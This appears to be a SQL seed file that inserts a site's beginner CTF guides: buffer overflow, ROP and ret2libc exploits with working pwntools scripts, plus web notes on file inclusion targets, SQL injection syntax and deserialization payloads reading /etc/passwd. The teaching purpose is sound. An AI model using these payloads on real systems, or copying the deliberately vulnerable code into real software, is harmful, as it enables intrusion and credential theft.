insert into series (series_id, title)
VALUES (1, 'Basic binary exploitation');
insert into series (series_id, title)
VALUES (2, 'Basic web exploitation');
insert into post (poster_username, post_category, title)
VALUES ('jro', 'Pwn', 'Buffer overflows');
insert into guide (guide_id, description, body, series_id, guide_number)
VALUES ((select max(post_id) from post), 'Basic buffer overflows', '# Buffer overflow

Consider the code below:

```c
#include <stdio.h>
void shell(){
    system("/bin/sh");
}
int main(){
    char name[16];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc bof.c -o bof -no-pie -fno-stack-protector`

Let''s test it out. As expected, the input is echoed back.

```
➜ ./bof
Enter name: hshshhshs
Hello: hshshhshs
```

We will get a segmentation fault if the input is more than 16 characters long.

```
➜ ./bof
Enter name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hello: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    1654 segmentation fault  ./bof
```

## The stack

The stack grows from high memory addresses to low memory addresses.

The top of the stack is represented by `rbp` **(frame base pointer)**. `ebp` functions the same way as `rbp`, except it is 4 bytes instead of 8 bytes as addresses are 4 bytes on 32 bit (x86) systems. Because the stack grows from high addresses to low addresses, addresses on the stack are often represented by `rbp - x`, where x is a hex number. For example: `lea rdi,[rbp-0x10]` sets `rdi` to the address at index 16 on the stack.

The stack contains many frames, one for each function call. For this exploit we can confine ourselves to a single frame.

`rsp` is the **stack pointer** which points to the top of the stack frame (ie the lowest allocated memory address). `rbp`>`rsp` as the stack grows downwards.

At the bottom (highest memory address) of the frame is the **return address pointer** or `rip`. This points to the next instruction to be called after the function returns ([ret](https://www.felixcloutier.com/x86/ret)). Next is `rbp`, which points to itself (this may be 4 or 8 bytes depending on x64/x86).

Local variables are then pushed on the stack (decrementing `rsp`), in the order they are declared.

<img src="https://www.coengoedegebure.com/content/images/2018/08/stackbuffer.png" alt="stackbuffer" style="zoom: 50%;" />

However, buffers are filled in the opposite direction (towards `rbp`) on the stack.

<img src="https://www.coengoedegebure.com/content/images/2018/08/memoryoverflow-1.png" alt="memoryoverflow-1" style="zoom:50%;" />

This allows us to overwrite `rip`, thus allowing us to control the flow of the program.

## Registers

[X86 64 Register and Instruction Quick Start - CDOT Wiki (senecacollege.ca)](https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start)

`rbp`: Register base pointer (stack base pointer)

`rsp`: Register stack pointer (stack top pointer)

`rip`: Return instruction pointer

`rdi`: Register destination index (first argument in function call)

`rsi`: Register source index (second argument in function call)

`rdx`: Register d extended (third argument in function call)

`rcx`: Register c extended (4th argument in function call)

`r8d`: 5th argument in function call

`r9d`: 6th argument in function call

## Analysis of our program

Let''s run the program in `gdb` and find out what''s going on.

```assembly
gdb-peda$ disas main
Dump of assembler code for function main:
   0x000000000000117d <+0>:     push   rbp
   0x000000000000117e <+1>:     mov    rbp,rsp
   0x0000000000001181 <+4>:     sub    rsp,0x10
   0x0000000000001185 <+8>:     mov    rax,QWORD PTR [rip+0x2ebc]        # 0x4048 <stdout@GLIBC_2.2.5>
   0x000000000000118c <+15>:    mov    rcx,rax
   0x000000000000118f <+18>:    mov    edx,0xc
   0x0000000000001194 <+23>:    mov    esi,0x1
   0x0000000000001199 <+28>:    lea    rdi,[rip+0xe6c]        # 0x200c
   0x00000000000011a0 <+35>:    call   0x1060 <fwrite@plt>
   0x00000000000011a5 <+40>:    lea    rax,[rbp-0x10]
   0x00000000000011a9 <+44>:    mov    rdi,rax
   0x00000000000011ac <+47>:    mov    eax,0x0
   0x00000000000011b1 <+52>:    call   0x1050 <gets@plt>
   0x00000000000011b6 <+57>:    mov    rax,QWORD PTR [rip+0x2e8b]        # 0x4048 <stdout@GLIBC_2.2.5>
   0x00000000000011bd <+64>:    mov    rcx,rax
   0x00000000000011c0 <+67>:    mov    edx,0x7
   0x00000000000011c5 <+72>:    mov    esi,0x1
   0x00000000000011ca <+77>:    lea    rdi,[rip+0xe48]        # 0x2019
   0x00000000000011d1 <+84>:    call   0x1060 <fwrite@plt>
   0x00000000000011d6 <+89>:    lea    rax,[rbp-0x10]
   0x00000000000011da <+93>:    mov    rdi,rax
   0x00000000000011dd <+96>:    call   0x1030 <puts@plt>
   0x00000000000011e2 <+101>:   mov    eax,0x0
   0x00000000000011e7 <+106>:   leave
   0x00000000000011e8 <+107>:   ret
End of assembler dump.
```

First, `rbp` is pushed onto the stack and `rsp` is moved into `rbp`, setting them to the same value.

Next, 16 bytes are allocated for the buffer:` sub rsp,0x10`

Next, the `gets` function call:

```asm
0x00000000000011a5 <+40>:    lea    rax,[rbp-0x10]
0x00000000000011a9 <+44>:    mov    rdi,rax
0x00000000000011ac <+47>:    mov    eax,0x0
0x00000000000011b1 <+52>:    call   0x1050 <gets@plt>
```

In line 1, the [LEA](https://www.felixcloutier.com/x86/lea) (load effective address) loads the address of `rbp-16` into `rax`. This is the address of the ''end'' of the buffer. The buffer will be filled from here up towards `rbp`. In line 2, `rax` is moved into `rdi`, which is the pointer for the first argument of a function. In line 4, `gets` is called.

Our goal is to call the `shell` function, so let''s find out where it is:

```asm
gdb-peda$ disas shell
Dump of assembler code for function shell:
   0x0000000000401152 <+0>:     push   rbp
```

So the function is at `0x0000000000401152`. We can begin to craft our payload using pwntools.

## Pwntools

```python
# Import pwntools
from pwn import *

# Start process
p = process("./bof")
# Load ELF
e = ELF("./bof")

# Get address of shell function from ELF
# p64(x) to turn x into 64 bit little endian
address = p64(e.symbols["shell"])

# 16 bytes to fill buffer, 8 bytes for rbp
offset = 16 + 8

payload = b"a" * offset + address
# Send payload
p.sendline(payload)
# Allow us to get shell afterwards!
p.interactive()
```

Output:

```shell
➜ python3 exp-bof.py
[+] Starting local process ''./bof'': pid 2191
[*] ''/home/kali/Desktop/ctf-stuff/pwn/bof''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
Enter name: Hello: aaaaaaaaaaaaaaaaaaaaaaaaR\x11
$ ls
bof  bof.c exp-bof.py
$
```

', 1, 1);
insert into post (poster_username, post_category, title)
VALUES ('jro', 'Pwn', 'Return oriented programming');
insert into guide (guide_id, description, body, series_id, guide_number)
VALUES ((select max(post_id) from post), 'Return oriented programming', '# ROP

The code has been modified to add a parameter for the shell function. Can we still exploit it?

```c
#include <stdio.h>
int shell(int x){
    if(x==123456){
        system("/bin/sh");
    }else{
        printf("Die");
    }
}

int main(){
    char name[100];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc chal.c -o chal -no-pie -fno-stack-protector`

Looking at the disassembly, it seems 112 (0x70) bytes are allocated for the name buffer.

```asm
0x00000000004011c5 <+40>:    lea    rax,[rbp-0x70]
0x00000000004011c9 <+44>:    mov    rdi,rax
0x00000000004011cc <+47>:    mov    eax,0x0
0x00000000004011d1 <+52>:    call   0x401060 <gets@plt>
```

If we follow the same procedure it buffer overflow, we get the following payload:

```python
# Remember +8 bytes for rbp
p.sendline(b"a"*120+p64(elf.symbols["shell"]))
```

However, this segfaults because we did not pass `shell` any parameters. We can use return oriented programming (ROP) to overcome this.

## Principles

Recall that the `rdi` register is used to pass data as the first argument of a function. For example, in the disassembly above,

```asm
lea  rax,[rbp-0x70]
mov  rdi,rax
call 0x401060 <gets@plt>
```

the address `rbp-0x70` is moved into `rdi` to be passed to `gets`.

But how do we set `rdi` to whatever we want? Luckily, the binary is full of random instructions we can jump to, known as gadgets. We can use the ropper tool to list all useful gadgets.

```shell
➜ ropper -f chal
Gadgets
=======
[stuff]
0x0000000000401267: pop rbp; pop r14; pop r15; ret;
0x0000000000401149: pop rbp; ret;
0x000000000040126b: pop rdi; ret;  <--
0x0000000000401269: pop rsi; pop r15; ret;
[stuff]
```

Let''s look at the gadget `pop rdi; ret;`. Before we find out how it helps us, we must understand what it does.

**`pop rdi;`**

[pop](https://www.felixcloutier.com/x86/pop): Loads the value from the top of stack into the destination specified (`rdi`) and **increments the stack pointer**. Remember that the `rbp` is the base (highest address) of the stack, `rip` > `rbp` > `rsp`. By incrementing `rsp`, `rsp` moves toward `rbp`.

**`ret;`**

`ret` pops the **value pointed to by `rsp`** into `rip` and increments `rsp`.

## Working through the attack

The bottom half of `main` is provided for reference:

```asm
0x00000000004011f6 <+89>:    lea    rax,[rbp-0x70]
0x00000000004011fa <+93>:    mov    rdi,rax
0x00000000004011fd <+96>:    call   0x401030 <puts@plt>
0x0000000000401202 <+101>:   mov    eax,0x0
0x0000000000401207 <+106>:   leave
0x0000000000401208 <+107>:   ret
```

Let''s say our stack looks like this at `main + 101`:

| Address              | Name          | Value                                  |
| -------------------- | ------------- | -------------------------------------- |
| `rbp+24`             | -             | Address of `shell`                     |
| `rbp+16`             | -             | 123456                                 |
| `rbp+8`              | `rip`         | Address of `pop rdi; ret;` gadget      |
| `rbp`                | `rbp`         | Address of `rbp` / any arbitrary value |
| `rbp-112` to `rbp-1` | `name` buffer | a 112 times                            |
| `rbp-112`            | `rsp`         | a                                      |

The leave instruction is [equivalent to:](https://stackoverflow.com/a/29790275/11168593)

```asm
mov rsp,rbp
pop rbp
```

Thus, when `main + 106` (`leave`) is executed, `rsp` is set to `rbp`. Then, the top of the stack (`rsp` = `rbp` ) is popped into `rbp` (essentially a no-op). However, this pop increments `rsp`. Thus, the stack now looks like this:

| Address  | Name        | Value                             |
| -------- | ----------- | --------------------------------- |
| `rbp+24` | -           | Address of `shell`                |
| `rbp+16` | -           | 123456                            |
| `rbp+8`  | `rip`/`rsp` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp`       | Address of `rbp`                  |

When `main + 107` (`ret`) is executed, `rsp` is popped into `rip` (no-op because they are the same address). Then, `rsp` is incremented. Thus the stack now looks like this:

| Address  | Name  | Value                             |
| -------- | ----- | --------------------------------- |
| `rbp+24` | -     | Address of `shell`                |
| `rbp+16` | `rsp` | 123456                            |
| `rbp+8`  | `rip` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp` | Address of `rbp`                  |

Now, the instruction pointed to by `rip` is executed.

a. `pop rdi`: Pops `rsp` (12356) into `rdi` (yay) and increments `rsp`. The stack now looks like this:

| Address  | Name  | Value                             |
| -------- | ----- | --------------------------------- |
| `rbp+24` | `rsp` | Address of `shell`                |
| `rbp+16` | -     | 123456                            |
| `rbp+8`  | `rip` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp` | Address of `rbp`                  |
|          |       |                                   |
| ???      | `rdi` | 123456                            |

b. `ret`: Pops `rsp` (Address of `shell`) into `rip` (yay) and increments `rsp`. The stack now looks like this:

| Address  | Name  | Value              |
| -------- | ----- | ------------------ |
| `rbp+24` | -     | Address of `shell` |
| `rbp+16` | -     | 123456             |
| `rbp+8`  | `rip` | Address of `shell` |
| `rbp`    | `rbp` | Address of `rbp`   |
|          |       |                    |
| ???      | `rdi` | 123456             |

Next, the instruction at `rip` (Address of `shell`) is executed. Because `rdi` is `123456`, this is equivalent to `shell(123456)` which allows us to get a shell.

## Payload

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
rop = p64(0x000000000040126b)
p.sendline(b"a"*120+rop+p64(123456)+p64(e.symbols["shell"]))
p.interactive()
```

## Stack alignment?

The payload above works in kali but not on Ubuntu, because of the [MOVAPS issue](https://www.cameronwickes.com/stack-alignment-ubuntu-18-04-movaps/). On Ubuntu 18.04, the MOVAPS (move aligned packed single precision) instruction is used to move data (4 32 bit single precision floats / 16 bytes).

As its name indicates:

> When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated.

Our stack is not aligned on 16 bytes, thus an exception is generated.

We can resolve this issue by adding another gadget: `0x0000000000401016: ret; `. The starting stack now looks like this:

| Address  | Name        | Value                             |
| -------- | ----------- | --------------------------------- |
| `rbp+32` | -           | Address of `shell`                |
| `rbp+24` | -           | Address of `ret;` gadget          |
| `rbp+16` | -           | 123456                            |
| `rbp+8`  | `rip`/`rsp` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp`       | Address of `rbp`                  |

Now, our stack is aligned to 16 bytes, so the exploit will work. You can trace through the stack for each instruction to verify that it works. In the end, the stack should look like this:

| Address  | Name  | Value                   |
| -------- | ----- | ----------------------- |
| `rbp+32` | -     | Address of `shell`      |
| `rbp+24` | -     | Address of `ret` gadget |
| `rbp+16` | -     | 123456                  |
| `rbp+8`  | `rip` | Address of `shell`      |
| `rbp`    | `rbp` | Address of `rbp`        |
| `rdi`    |       | 123456                  |

## Payload

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
rop = p64(0x000000000040126b)
rop2 = p64(0x0000000000401016)
p.sendline(b"a"*120+rop+p64(123456)+rop2+p64(e.symbols["shell"]))
p.interactive()
```

## Alternative using pwntools ROP library

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
context.binary = e
rop = ROP(e)
rop.call(rop.ret)
rop.call(e.symbols["shell"],(123456,))

p.sendline(b"a"*120+rop.chain())

p.interactive()
```

The ROP library automatically finds and sticks together gadgets to create an equivalent payload.', 1, 2);

insert into post (poster_username, post_category, title)
VALUES ('jro', 'Pwn', 'Ret2libc');
insert into guide (guide_id, description, body, series_id, guide_number)
VALUES ((select max(post_id) from post), 'Return to LIBC', '# Ret2libc

The code is the same as shellcode, but the executable is different.

```c
#include <stdio.h>
int main(){
    char name[100];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc chal.c -o chal -no-pie`

ASLR disabled.

If we run `checksec chal`, we find that the executable has NX enabled. If we try to run the script from shellcode, we get a segfault. What can we do now?

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## libc

Libc provides code for the C standard library. It is a shared object that is typically provided with the challenge. Before we do any exploitation, we first need to find out which version of libc we are using and where it is located in the executable. We can use `ldd` to find out this information.

```
➜ ldd chal
linux-vdso.so.1 (0x00007ffff7fd0000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7df0000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd2000)
```

#### Important note

- In a CTF, libc version on server is probably different
- See [ret2libc-aslr](ret2libc-aslr.md) for leaking libc version

After we''ve got this information, exploiting is actually really simple with pwntools.

```python
from pwn import *

p = process("./chal")
e = ELF("./chal", checksec=False)
context.binary = e
rop = ROP(e)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
libc.address = 0x00007ffff7df0000
binsh = next(libc.search(b"/bin/sh"))
sys = libc.symbols["system"]
rop.call(sys,(binsh,))

p.sendline(b"a"*120+rop.chain())
p.interactive()
```

See [rop.md](rop.md) for an explanation of how this works.

', 1, 3);
insert into post (poster_username, post_category, title)
VALUES ('jro', 'Web', 'Local file inclusion');
insert into guide (guide_id, description, body, series_id, guide_number)
VALUES ((select max(post_id) from post),
        'Local file inclusion is a vulnerability where publicly inaccessible files on a server are leaked',
        '## Local file inclusion

**Files of interest:**

- `/etc/passwd`: Probably the first thing to check
- `/proc/self/environ`: Environment variables
- `/proc/self/cmdline`: Get what command the process was run with (can expose absolute path)
- Source code for the program
- `Dockerfile`
- `/etc/hosts`: Is it running in docker?
- `~/.bashrc`, `~/.bash_history`
- `~/.ssh/config`, `~/.ssh/id_rsa`



**PHP Stuff**

- Base64 encode: `php://filter/convert.base64-encode/resource=<file>` (Helpful to read source code of PHP files without executing)
- [expect://](https://www.php.net/manual/en/wrappers.expect.php): Probably won''t work, but nice RCE
- Can RCE using sessions: https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/
- Might also be able to include `/var/log/apache/access.log` or nginx logs (see HTB)



**Python**

- `os.path.join("anything","/") == "/"`

', 2, 1);
insert into post (poster_username, post_category, title)
VALUES ('jro', 'Web', 'SQL Injection');
insert into guide (guide_id, description, body, series_id, guide_number)
VALUES ((select max(post_id) from post),
        'SQL Injection is a vulnerability where a user can inject SQL commands into a database and execute them',
        '# SQL Injection

[SQL Injection Cheat Sheet | Netsparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

### Postgres

**Column names case sensitive!!**

Syntax: `ad'' || ''min''  or 1=1;--`

Version: `version()`

Quotes: Single for values, double for column name

[PostgreSQL: Documentation: 13: Chapter 51. System Catalogs](https://www.postgresql.org/docs/13/catalogs.html)

List tables: `select table_name from information_schema.tables`

List columns: `select column_name from information_schema.columns where table_name = ''table''`

### MySQL

**Column names not case sensitive**

Note: `Password` column of `mysql.user` only exists in mariadb. Use `authentication_string` for vanilla mysql. May have to use crackstation.

[mysql.user Table - MariaDB Knowledge Base](https://mariadb.com/kb/en/mysqluser-table/)

### Sqlite

**Column names not case sensitive**

Metadata:

[The Schema Table (sqlite.org)](https://sqlite.org/schematab.html)

List tables and sql: `select tbl_name, sql from sqlite_master `', 2, 2);

insert into post (poster_username, post_category, title)
VALUES ('jro', 'Web', 'Deserialization vulnerabilities');
insert into guide (guide_id, description, body, series_id, guide_number)
VALUES ((select max(post_id) from post),
        'The decoding and transformation of user supplied data into language objects can result in remote code execution.',
        '## PHP

[ref](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure Deserialization/PHP.md)

1. Look at code

2. Identify functions that do something malicious based on user input. Like:

   ```php
   class Foo{
       private $cmd = "ls";
       function __toString() {
           return system($this->cmd);
       }
   }
   ```

3. Find out where they are executed

   ```php
   $x = unserialize($_GET["data"]);
   echo $x;
   ```

4. Write class that sets parameters to what you want. Methods cannot be overridden.

   ```php
   class Foo{
       private $cmd = "cat /etc/passwd";
   }
   ```

5. Instantiate and serialize class

   ```php
   $f = new Foo();
   echo serialize($f);
   ```

**Things to note**:

- You cannot override methods
- You do not need to deserialize to a class that is correct, any class will do as long as it is loaded by the compiler



## Python pickle

[pickle — Python object serialization — Python 3.9.4 documentation](https://docs.python.org/3/library/pickle.html)

**Vulnerable code**:

```python
# Attacker''s code
import os
import pickle

class Exploit:
    def __reduce__(self):
        # os doesn''t need to be imported on the victim
        return os.system, ("cat /etc/passwd",)

pic = pickle.dumps(Exploit())

# Victim''s code
data = pickle.loads(pic)
```

**Notes**:

- Python version must match
- All python versions are vulnerable



## YAML deserialization

[ref](https://github.com/yaml/pyyaml/issues/420)

**Payload**:

```yaml
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - [ "print(__import__(''os'').system(''ls''))" ]
```

**Vulnerable code:**

```python
import yaml
yaml.load(payload)
```
', 2, 3);
